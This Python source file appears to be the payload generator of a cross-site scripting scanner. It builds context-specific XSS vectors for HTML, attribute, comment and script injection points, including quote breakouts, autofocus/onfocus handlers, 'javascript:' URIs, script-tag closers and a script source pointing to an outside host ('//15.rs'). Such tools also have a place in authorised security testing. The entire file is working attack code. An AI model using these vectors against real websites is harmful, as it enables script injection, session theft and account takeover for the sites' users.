from core.config import xsschecker, badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions
from core.jsContexter import jsContexter
from core.utils import randomUpper as r, genGen, extractScripts


def generator(occurences, response):
    scripts = extractScripts(response)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}
    for i in occurences:
        context = occurences[i]['context']
        if context == 'html':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            badTag = occurences[i]['details']['badTag'] if 'badTag' in occurences[i]['details'] else ''
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends, badTag)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'attribute':
            found = False
            tag = occurences[i]['details']['tag']
            Type = occurences[i]['details']['type']
            quote = occurences[i]['details']['quote'] or ''
            attributeName = occurences[i]['details']['name']
            attributeValue = occurences[i]['details']['value']
            quoteEfficiency = occurences[i]['score'][quote] if quote in occurences[i]['score'] else 100
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if greatBracketEfficiency == 100 and quoteEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    payload = quote + '>' + payload
                    found = True
                    vectors[9].add(payload)
            if quoteEfficiency == 100:
                for filling in fillings:
                    for function in functions:
                        vector = quote + filling + r('autofocus') + \
                            filling + r('onfocus') + '=' + quote + function
                        found = True
                        vectors[8].add(vector)
            if quoteEfficiency == 90:
                for filling in fillings:
                    for function in functions:
                        vector = '\\' + quote + filling + r('autofocus') + filling + \
                            r('onfocus') + '=' + function + filling + '\\' + quote
                        found = True
                        vectors[7].add(vector)
            if Type == 'value':
                if attributeName == 'srcdoc':
                    if occurences[i]['score']['&lt;']:
                        if occurences[i]['score']['&gt;']:
                            del ends[:]
                            ends.append('%26gt;')
                        payloads = genGen(
                            fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                        for payload in payloads:
                            found = True
                            vectors[9].add(payload.replace('<', '%26lt;'))
                elif attributeName == 'href' and attributeValue == xsschecker:
                    for function in functions:
                        found = True
                        vectors[10].add(r('javascript:') + function)
                elif attributeName.startswith('on'):
                    closer = jsContexter(attributeValue)
                    quote = ''
                    for char in attributeValue.split(xsschecker)[1]:
                        if char in ['\'', '"', '`']:
                            quote = char
                            break
                    suffix = '//\\'
                    for filling in jFillings:
                        for function in functions:
                            vector = quote + closer + filling + function + suffix
                            if found:
                                vectors[7].add(vector)
                            else:
                                vectors[9].add(vector)
                    if quoteEfficiency > 83:
                        suffix = '//'
                        for filling in jFillings:
                            for function in functions:
                                if '=' in function:
                                    function = '(' + function + ')'
                                if quote == '':
                                    filling = ''
                                vector = '\\' + quote + closer + filling + function + suffix
                                if found:
                                    vectors[7].add(vector)
                                else:
                                    vectors[9].add(vector)
                elif tag in ('script', 'iframe', 'embed', 'object'):
                    if attributeName in ('src', 'iframe', 'embed') and attributeValue == xsschecker:
                        payloads = ['//15.rs', '\\/\\\\\\/\\15.rs']
                        for payload in payloads:
                            vectors[10].add(payload)
                    elif tag == 'object' and attributeName == 'data' and attributeValue == xsschecker:
                        for function in functions:
                            found = True
                            vectors[10].add(r('javascript:') + function)
                    elif quoteEfficiency == greatBracketEfficiency == 100:
                        payloads = genGen(fillings, eFillings, lFillings,
                                          eventHandlers, tags, functions, ends)
                        for payload in payloads:
                            payload = quote + '>' + r('</script/>') + payload
                            found = True
                            vectors[11].add(payload)
        elif context == 'comment':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'script':
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            closer = jsContexter(script)
            quote = occurences[i]['details']['quote']
            scriptEfficiency = occurences[i]['score']['</scRipT/>']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = 100
            if quote:
                breakerEfficiency = occurences[i]['score'][quote]
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if scriptEfficiency == 100:
                breaker = r('</script/>')
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[10].add(payload)
            if closer:
                suffix = '//\\'
                for filling in jFillings:
                    for function in functions:
                        vector = quote + closer + filling + function + suffix
                        vectors[7].add(vector)
            elif breakerEfficiency > 83:
                suffix = '//'
                for filling in jFillings:
                    for function in functions:
                        if '=' in function:
                            function = '(' + function + ')'
                        if quote == '':
                            filling = ''
                        vector = '\\' + quote + closer + filling + function + suffix
                        vectors[6].add(vector)
            index += 1
    return vectors
